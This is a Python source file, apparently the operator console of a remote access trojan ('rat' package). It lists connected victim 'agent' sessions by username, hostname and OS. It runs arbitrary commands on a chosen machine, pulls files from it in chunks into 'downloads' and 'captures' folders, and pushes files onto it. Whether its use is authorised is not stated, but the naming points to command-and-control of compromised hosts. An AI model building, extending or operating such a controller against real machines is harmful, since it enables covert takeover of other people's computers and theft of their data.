from __future__ import annotations

import shlex
import time
from dataclasses import dataclass
from pathlib import Path

from prompt_toolkit import PromptSession
from prompt_toolkit.completion import WordCompleter

from rat.server.app import ServerApp, Session


@dataclass
class CLIState:
    active_session_id: str | None = None


SERVER_COMMANDS = [
    "help",
    "sessions",
    "interact",
    "disconnect",
    "exit",
    "quit",
]


def _format_session(sess: Session) -> str:
    age = int(time.time() - sess.connected_at)
    info = sess.info.to_dict() if sess.info else {}
    who = f"{info.get('username', '?')}@{info.get('hostname', '?')}"
    os_name = info.get("os", "?")
    return f"Agent {sess.session_id} | {who} | {os_name} | {sess.addr[0]}:{sess.addr[1]} | {age}s"


def run_cli(app: ServerApp) -> None:
    state = CLIState()
    session: PromptSession[str] = PromptSession()
    completer = WordCompleter(SERVER_COMMANDS, ignore_case=True)

    def prompt_text() -> str:
        if state.active_session_id is None:
            return "rat > "
        return f"rat agent {state.active_session_id} > "

    while True:
        try:
            line = session.prompt(prompt_text(), completer=completer).strip()
        except (EOFError, KeyboardInterrupt):
            app.log.info("Exiting.")
            return

        if not line:
            continue

        if state.active_session_id is None:
            _handle_server_command(app, state, line)
        else:
            _handle_agent_command(app, state, line)


def _handle_server_command(app: ServerApp, state: CLIState, line: str) -> None:
    parts = shlex.split(line)
    cmd = parts[0].lower()
    args = parts[1:]

    if cmd in {"exit", "quit"}:
        raise SystemExit(0)

    if cmd == "help":
        app.log.info("Server commands: %s", ", ".join(SERVER_COMMANDS))
        app.log.info("Use 'sessions' then 'interact <id>' to control an agent.")
        return

    if cmd == "sessions":
        sessions = app.list_sessions()
        if not sessions:
            app.log.info("No active sessions.")
            return
        for sess in sessions.values():
            app.log.info(_format_session(sess))
        return

    if cmd == "disconnect":
        if not args:
            app.log.info("Usage: disconnect <id>")
            return
        app.remove_session(args[0])
        app.log.info("Disconnected session %s", args[0])
        return

    if cmd == "interact":
        if not args:
            app.log.info("Usage: interact <id>")
            return
        if app.get_session(args[0]) is None:
            app.log.info("Unknown session: %s", args[0])
            return
        state.__dict__.update(CLIState(active_session_id=args[0]).__dict__)
        app.log.info("Interacting with agent %s. Type 'back' to return.", args[0])
        return

    app.log.info("Unknown server command: %s (try 'help')", cmd)


def _handle_agent_command(app: ServerApp, state: CLIState, line: str) -> None:
    if line.strip().lower() in {"back", "exit", "quit"}:
        state.__dict__.update(CLIState(active_session_id=None).__dict__)
        return

    sess = app.get_session(state.active_session_id or "")
    if sess is None:
        app.log.info("Session closed.")
        state.__dict__.update(CLIState(active_session_id=None).__dict__)
        return

    parts = shlex.split(line)
    cmd = parts[0].lower() if parts else ""

    try:
        if cmd == "download":
            _server_download(app, sess, parts[1:])
            return
        if cmd == "upload":
            _server_upload(app, sess, parts[1:])
            return

        result = sess.peer.request("run", {"line": line}, timeout=120.0)
        data = result.get("data", {})
        app.log.info("Result: %s", data)
        _maybe_save_artifact(app, sess.session_id, data)
    except Exception as exc:
        app.log.error("Command failed: %s", exc)


def _maybe_save_artifact(app: ServerApp, session_id: str, data: object) -> None:
    if not isinstance(data, dict):
        return
    filename = data.get("filename")
    b64 = data.get("bytes_b64")
    if not isinstance(filename, str) or not isinstance(b64, str):
        return
    try:
        import base64
        raw = base64.b64decode(b64.encode())
    except Exception as exc:
        app.log.warning("artifact decode failed: %s", exc)
        return
    out_dir = Path("captures") / f"agent-{session_id}"
    out_dir.mkdir(parents=True, exist_ok=True)
    out_path = out_dir / filename
    out_path.write_bytes(raw)
    app.log.info("Saved artifact to %s", out_path)


def _server_download(app: ServerApp, sess: Session, args: list[str]) -> None:
    if not args:
        app.log.info("Usage: download <remote_path> [local_path]")
        return
    remote_path = args[0]
    local_path = args[1] if len(args) > 1 else None

    init = sess.peer.request("download_init", {"path": remote_path}, timeout=30.0).get("data", {})
    if not isinstance(init, dict):
        raise RuntimeError("Invalid download_init response")
    token = str(init["token"])
    size = int(init["size"])
    name = str(init.get("name") or Path(remote_path).name)

    out_dir = Path("downloads") / f"agent-{sess.session_id}"
    out_dir.mkdir(parents=True, exist_ok=True)
    out_path = Path(local_path) if local_path else (out_dir / name)

    chunk_size = 256 * 1024
    offset = 0
    with out_path.open("wb") as f:
        while offset < size:
            res = sess.peer.request(
                "download_chunk",
                {"token": token, "offset": offset, "length": min(chunk_size, size - offset)},
                timeout=60.0,
            ).get("data", {})
            if not isinstance(res, dict):
                raise RuntimeError("Invalid download_chunk response")
            chunk = res.get("chunk", b"")
            if not isinstance(chunk, bytes | bytearray):
                raise RuntimeError("Invalid chunk type")
            if not chunk:
                break
            f.write(bytes(chunk))
            offset += len(chunk)

    sess.peer.request("download_finish", {"token": token}, timeout=10.0)
    app.log.info("Downloaded %s bytes to %s", offset, out_path)


def _server_upload(app: ServerApp, sess: Session, args: list[str]) -> None:
    if len(args) < 2:
        app.log.info("Usage: upload <local_path> <remote_path>")
        return
    local_path = Path(args[0])
    remote_path = args[1]
    data = local_path.read_bytes()
    size = len(data)

    init = sess.peer.request(
        "upload_init",
        {"path": remote_path, "size": size},
        timeout=30.0,
    ).get("data", {})
    if not isinstance(init, dict):
        raise RuntimeError("Invalid upload_init response")
    token = str(init["token"])

    chunk_size = 256 * 1024
    offset = 0
    while offset < size:
        chunk = data[offset : offset + chunk_size]
        sess.peer.request(
            "upload_chunk",
            {"token": token, "offset": offset, "chunk": chunk},
            timeout=60.0,
        )
        offset += len(chunk)

    sess.peer.request("upload_finish", {"token": token}, timeout=10.0)
    app.log.info("Uploaded %s bytes from %s to %s", size, local_path, remote_path)